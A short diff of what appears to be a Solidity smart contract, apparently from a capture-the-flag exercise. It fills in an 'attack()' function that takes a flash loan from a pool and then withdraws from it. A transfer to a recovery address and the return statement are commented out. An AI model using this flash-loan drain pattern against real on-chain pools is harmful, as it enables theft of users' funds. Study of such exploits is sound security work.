@@ -16,6 +16,11 @@
     }
 
     function attack() external returns(bool) {
-        uint
+        pool.flashLoan(amountToAttack);
+        pool.withdraw();
+
+        // payable(recovery).transfer(amountToAttack);
+
+        // return true;
     }
  }
